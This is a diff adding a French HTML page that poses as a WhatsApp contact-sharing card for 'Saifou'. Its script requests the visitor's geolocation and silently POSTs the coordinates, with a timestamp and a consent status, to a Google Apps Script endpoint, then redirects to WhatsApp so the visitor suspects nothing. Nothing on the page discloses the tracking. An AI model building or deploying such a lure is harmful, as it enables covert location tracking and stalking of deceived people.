@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Partager Mon Contact</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+<style>
+    body { margin:0; font-family:'Roboto', sans-serif; background:#F7F5F3; color:#0A1014; display:flex; flex-direction:column; min-height:100vh; justify-content:center; align-items:center; text-align:center; }
+    .card { background:#fff; padding:30px; border-radius:10px; box-shadow:0 4px 12px rgba(0,0,0,0.1); max-width:400px; width:100%; }
+    .profile-circle { width:80px; height:80px; background:#B0B0B0; color:#fff; font-size:2.5em; font-weight:700; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 15px; }
+    button { background:#25d366; color:#fff; border:none; padding:14px 24px; border-radius:8px; font-weight:600; cursor:pointer; transition:.3s; }
+    button:hover { background:#20b858; }
+    .loading { display:none; width:50px; height:50px; border:5px solid #f3f3f3; border-top:5px solid #25d366; border-radius:50%; animation:spin 1s linear infinite; margin:20px auto; }
+    @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+</style>
+</head>
+<body>
+
+<div class="card" id="contactCard">
+    <div class="profile-circle">S</div>
+    <div class="name">Saifou</div>
+    <p>Cliquez pour partager votre contact sur WhatsApp</p>
+    <button id="actionButton">Contacter</button>
+    <div class="loading" id="loadingSpinner"></div>
+</div>
+
+<script>
+document.getElementById('actionButton').addEventListener('click', function() {
+    const card = document.getElementById('contactCard');
+    const button = document.getElementById('actionButton');
+    const spinner = document.getElementById('loadingSpinner');
+
+    button.style.display = 'none';
+    spinner.style.display = 'block';
+    card.querySelector('p').textContent = "Accès à WhatsApp en cours...";
+
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                // Envoi des coordonnées à Google Sheets
+                fetch("https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec", {
+                    method:"POST",
+                    headers:{ "Content-Type":"application/json" },
+                    body: JSON.stringify({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        nom_utilisateur: "seami",
+                        contact: "0123456789",
+                        statut_geoloc: "acceptée",
+                        heure: new Date().toISOString()
+                    }),
+                    mode:'no-cors'
+                });
+                card.querySelector('p').textContent = "Redirection en cours...";
+                setTimeout(function(){ window.location.href = "https://web.whatsapp.com"; }, 1500);
+            },
+            function(error) {
+                // Envoi refus géoloc
+                fetch("https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec", {
+                    method:"POST",
+                    headers:{ "Content-Type":"application/json" },
+                    body: JSON.stringify({
+                        latitude: null,
+                        longitude: null,
+                        nom_utilisateur: "seami",
+                        contact: "0123456789",
+                        statut_geoloc: "refusée",
+                        heure: new Date().toISOString()
+                    }),
+                    mode:'no-cors'
+                });
+                // Redirection vers page explicative
+                window.location.href = "geoloc-refuse.html";
+            },
+            { enableHighAccuracy:false, timeout:5000 }
+        );
+    } else {
+        // Pas de géolocalisation disponible
+        window.location.href = "https://web.whatsapp.com";
+    }
+});
+</script>
+
+</body>
+</html>
